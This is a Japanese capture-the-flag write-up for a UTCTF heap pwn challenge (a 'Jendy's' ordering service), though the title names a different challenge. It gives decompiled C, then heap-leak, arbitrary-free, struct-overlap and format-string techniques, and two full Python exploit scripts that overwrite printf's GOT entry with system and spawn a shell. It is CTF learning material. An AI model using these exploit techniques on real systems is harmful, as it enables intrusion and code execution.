# [pwn 1200pts] Encryption Service - UTCTF
64ビットバイナリです．
libcが配布されていたかは分かりませんが，とりあえず無い前提で進めていきます．
```
$ python solve.py
[*] './pwnable'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
IDAで解析しましょう．

商品を買い物かごに入れるサービスなので，やはりヒープ系の問題です．
全部Cに直しましたが商品の管理が意味不明だったので直訳しています．
```c
typedef struct {
  char* first;
  char* last;
  char* name;
  long n;
} st_cart;

void add_name(st_cart *cart)
{
  puts("What is your name?");
  cart->name = malloc(0x20);
  fgets(cart->name, 0x20, stdin);
}

void add_item(st_cart *cart)
{
  int i, n, choice;
  char *item;
  char *first;

  puts("Which item would you like to order from Jendy's?");
  for(i = 0; i <= 4; i++) {
    printf("%d. %s\n", i, options[i]);
  }

  scanf("%d%*c", &choice);

  if (0 <=choice && choice <= 4) {
    item = malloc(0x20);
    strncpy(item, options[choice], strlen(options[choice]));
    first = cart->first;
    cart->n += 1;

    if (first == 0) {
      cart->first = item;
      cart->last = item;
    } else {
      (void*)((unsigned long)(cart->last) + 0x18) = (void*)item;
      cart->last = item;
    }
  } else {
    puts("Not a valid option!");
  }
}

void remove_item(st_cart *cart)
{
  int index;
  char *ptr, *last;
  puts("Please enter the number of the item from your order that you wish to remove");
  scanf("%d%*c", &index);
  if (index >= 0) {
    ptr = cart->first;
    if (ptr != NULL && index == 0) {
      free(ptr);
      cart->first = 0;
      cart->last = 0;
      cart->n -= 1;
    } else {
      for(i = 0; ptr != NULL; i++) {
	if (i == index) break;
	last = ptr;
	ptr = (char*)((unsigned long)ptr + 0x18);
      }
      if (ptr != NULL) {
	if (i == index) {
	  cart->n -= 1;
	  if (index == 0) {
	    free(cart->last);
	    cart->last = last;
	  } else {
	    (void*)((unsigned long)last + 0x18) = (void*)((unsigned long)ptr + 0x18)
	    free(ptr);
	  }
	  cart->n -= 1;
	}
      }
    }
  }
}

void view_order(st_cart *cart)
{
  int i:
  char msg[0x28];
  char *item;

  snprintf(msg, 0x28, "Name: %s\n", cart->name);
  printf("%s", msg);
  item = cart->first;

  for(i = 0; i < cart->n; i++) {
    printf("Item #%d: ", i);
    printf(item);
    putchar(0x0A);
    item = (char*)((unsigned long)item + 0x18);
  }
}

void checkout(st_cart *cart)
{
  puts("Thank you for for ordering at Jendy's!");
}

int main(void)
{
  st_cart *cart;
  int choice;

  setbuf(stdin, 0);
  setbuf(stdout, 0);

  cart = (st_cart)malloc(0x20);

  print_menu();
  scanf("%d%*c", &choice);

  while(1) {
    switch(choice) {
    case 1:
      add_name(cart);
      break;
    case 2:
      add_item(cart);
      break;
    case 3:
      remove_item(cart);
      break;
    case 4:
      view_order(cart);
      break;
    case 5:
      checkout(cart);
      return 0;
    default:
      puts("Not a valid choice!");
      break;
    }
  }
  
  return 0;
}
```

`cart->last`から0x18バイト間隔で商品のリスト名へのポインタが格納されます．
removeの処理がカオスなのでここに脆弱性がありそうです．

最初の商品を削除するときに`cart->first`と`cart->last`を0にしてしまっています．
このため，最初の商品を削除すると，例えば商品一覧を見ようとすると，2回目に0x18にアクセスしようとして落ちます．
```
[ 1267.763027] pwnable[7890]: segfault at 18 ip 0000000000400ce0 sp 00007ffc310bc5d0 error 4 in pwnable[400000+2000]
```

また，`view_order`にはFSB脆弱性がありますが，itemの名前は固定です．
ユーザーが入力できるのはnameだけなので，これを上手く使わないとダメそうです．

さて，あるアイテム名のアドレスは前のアイテム名のアドレスから0x18足した場所にあります．
怪しいですが，item用には0x20バイト確保しているので問題なさそうです．
アイテムのうち最も名前が長いのは"Peppercorn Mushroom Melt"ですが，これは0x18バイトなので，次のアイテムがある場合は`view_orders`でアドレスがリークできます．
```
Welcome to Jendy's, How may we take your order?
1. Add Name to Order
2. Add Item to Order
3. Remove Item from Order
4. View order
5. Checkout
>4
Item #0: Four for Four
Item #1: Nuggies
Item #2: Peppercorn Mushroom Melt�@�
Item #3: Dave's Single
```
ということでヒープのアドレスは分かりました．
（アドレスの下位1バイトが0にならないように注意）

さて，最後のアイテムを削除したときの挙動を使ってみましょう．
最後のアイテムを削除すると`cart->last`が1つ前のアイテムになります．
例えば2つアイテムを用意します．
```
cart->first = item1
cart->last = item2
cart->n = 2
name = NULL
*(item1 + 0x18) = item2
```
この状態で2つ目のアイテムを削除すると，次のようになります．
```
cart->first = item1
cart->last = item1
cart->n = 1
*(item1 + 0x18) = item2
fastbins[for 0x20] = item2
```
さらにこの状態で名前を取得します．
```
cart->first = item1
cart->last = item1
cart->n = 1
*(item1 + 0x18) = item2
name = item2
```
するとitem1からnameに向けてリストが繋がることが分かります．
ただし，nは1のままなので`view_order`で中身を参照するなどはできません．
しかし，`remove_item`ではnをチェックしておらず，リストを辿っていくだけなのでnameに書かれたアドレスをfreeできます．
ヒープのアドレスは持っているので，任意のアドレスをfreeできそうです．
cartを削除し，nameをmallocすることでcart内の各種アドレスを上書きできます．
`cart->first`を`add_name`で確保したアドレスにすればFSBを引き起せます．

まずは自分の用意した文字列をitemの名前として認識させましょう．
fgetsは終端をNULLにしますが，ヒープのアドレスの最後のバイトはNULLなので問題ありません．
```python
from ptrlib import *

def add_name(name):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvline()
    sock.sendline(name)

def add_item(item):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.sendline(str(item))

def view_order(item):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("Item #" + str(item) + ": ")
    return sock.recvline().rstrip()

def remove_item(item):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.recvline()
    sock.sendline(str(item))

elf = ELF("./pwnable")

sock = Socket("127.0.0.1", 9001)
_ = input()

# leak heap address
add_item(3)
add_item(0)
item = view_order(0)
addr_heap = u64(item[0x18:])
dump("heap = " + hex(addr_heap)) # address to the name of item[1]
addr_cart0 = addr_heap - 0x70 + 0x10

# forgery name link
fake_name = b'A' * 0x18
fake_name += p64(addr_cart0)
remove_item(1)
add_name(fake_name) # addr_heap

# malloc for FSB
payload = "%p"
add_name(payload) # addr_heap + 0x60

# cart overlap
fake_cart = b''
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap)
fake_cart += p64(1)
remove_item(2)
add_name(fake_cart)

# FSB
print(view_order(0))

sock.interactive()
```

ここまで長かった......
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9001

[ptrlib] heap = 0x23db070
b'0x7ffcf343a690'
[ptrlib]$
```

gdbで調べると，FSBでスタック上2つ目にあるアドレスは`_IO_stdfile_1_lock`だそうです．
また，5つ目のアドレスは`vfprintf+19661`でした．
```
gdb-peda$ x/4wx 0x7f2d8289ea00
0x7f2d8289ea00 <_IO_stdfile_1_lock>:    0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/4wx 0x7f2d8252314d
0x7f2d8252314d <vfprintf+19661>:        0xfaf0bd80      0x0f00ffff      0xffcacd85      0x058b48ff
```
dockerが無いので，とりあえずこの2つからlibcが特定できたとして話を進めます．
（もう少し先に`__libc_start_main+ret`もあったので大丈夫そうです．）
libcのロードアドレスは特定できたので任意のアドレスを呼び出す方法を考えましょう．

```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9001
[ptrlib] heap = 0x92b070
[ptrlib] libc_base = 0x7f363a8f3000
```

今回はGOTを書き換える方法を取ります．
スタック上にスタック周辺のアドレスを指したポインタがあるので，これを利用しましょう．
```
gdb-peda$ x/32xg $rsp
0x7ffcd7420fe0: 0x0000000000400810      0x0000000000a42010
0x7ffcd7420ff0: 0x0000000000000000      0x0000000000a420d0
0x7ffcd7421000: 0x000a203a656d614e      0x00007ffcd7421030
0x7ffcd7421010: 0x0000000000400810      0x00007fdbe9b1c54e
0x7ffcd7421020: 0x0000000000000000      0x90ad6d3292567500
0x7ffcd7421030: 0x00007ffcd7421070 <--+ 0x0000000000400dde
0x7ffcd7421040: 0x00007ffcd7421158    | 0x0000000100000000
0x7ffcd7421050: 0x0000000000400e20    | 0x0000000400400810
0x7ffcd7421060: 0x0000000000a42010    | 0x90ad6d3292567500
0x7ffcd7421070: 0x0000000000000000 <--+ 0x00007fdbe9acc3d5
```

このとき，上のように上位4バイトが0でないと，使う時に64bitで認識されて変なアドレスになってしまいます．

FSBを2回以上する必要がありますが，最後のアイテムを削除してやれば問題ありません．
このときnがデクリメントされるので，最初のオーバーライト時にnを大きくしておきましょう．
また，偽装したアイテムの最後のポインタは自身のアドレスを指すなどして，nが大きくても参照エラーにならないように注意しましょう．
~~あと，system関数のアドレスを書き込む際は流石に一気に64bitアドレスを書き込むのは無理があるので，32bitごとに分けます．~~
そもそもGOTにあるアドレスの上位4バイトはsystem関数と同じなので変更する必要がありません．

```python
from ptrlib import *

def add_name(name):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvline()
    sock.sendline(name)

def add_item(item):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.sendline(str(item))

def view_order(item):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("Item #" + str(item) + ": ")
    return sock.recvline().rstrip()

def remove_item(item):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.sendline(str(item))

elf = ELF("./pwnable")
libc = ELF("./libc-2.17.so")

sock = Socket("127.0.0.1", 9001)
_ = input()

# leak heap address
add_item(3)
add_item(0)
item = view_order(0)
addr_heap = u64(item[0x18:])
dump("heap = " + hex(addr_heap)) # address to the name of item[1]
addr_cart0 = addr_heap - 0x70 + 0x10

# forgery name link
fake_name = b'A' * 0x18
fake_name += p64(addr_cart0)
remove_item(1)
add_name(fake_name) # addr_heap

# malloc for FSB
# cart->first --> name0 --> name1 --> name2 --> name2 --> ...
payload = b"%2$p"
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0xc0)
add_name(payload) # addr_heap + 0x60: item0
payload = str2bytes("%{}c%16$n".format(elf.got("printf")))
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0x120)
add_name(payload) # addr_heap + 0xc0: item1
payload = b'X' * 0x18
payload += p64(addr_heap + 0x120)
add_name(payload) # addr_heap + 0x120: item2, item3, ...

# cart overlap
fake_cart = b''
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap)
fake_cart += p64(8)
remove_item(2)
add_name(fake_cart)

# 1st FSB
addr_IO_stdfile_1_lock = int(view_order(0).split(b'.')[0], 16)
libc_base = addr_IO_stdfile_1_lock - libc.symbol('_IO_stdfile_1_lock')
addr_system = libc_base + libc.symbol("system")
dump("libc_base = " + hex(libc_base))

# malloc for FSB
a = sock.recvonce(elf.got("printf"))
remove_item(6) # last item
payload = str2bytes("%{}c%24$n".format(addr_system & 0xffffffff))
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0x1e0)
add_name(payload) # addr_heap + 0x120: item0
payload = b'A' * 0x18
payload += p64(addr_heap + 0x240)
add_name(payload) # addr_heap + 0x1e0: item1
payload = b'B' * 0x18
payload += p64(addr_heap + 0x2a0)
add_name(payload) # addr_heap + 0x240: item2
payload = b'C' * 0x18
payload += p64(addr_heap + 0x300)
add_name(payload) # addr_heap + 0x2a0: item3
payload = b'/bin/sh\x00'
add_name(payload) # addr_heap + 0x300: item3
remove_item(1)
remove_item(2)

# 2nd FSB
sock.recv()
view_order(0)
sock.recvonce(addr_system & 0xffffffff)

# get the shell!
dump("OK!", "success")

sock.interactive()
```

シェルが取れるまでにやや時間がかかりますが，一応できています．
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9001
[ptrlib] heap = 0x1664070
[ptrlib] libc_base = 0x7ff71a2c7000
[+] OK!
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),10(wheel),982(docker)
```

# 感想
ヒープ系の問題はしばらくtcacheやoverlapなどを使っていたので，今回や前回(Encryption Service)のような問題は新鮮でした．
UTCTFに結構時間をかけてしまいましたが，面白かったです．

# 参考文献
[1] [https://exploitnetworking.com/en/security-en/jendys](https://exploitnetworking.com/en/security-en/jendys)
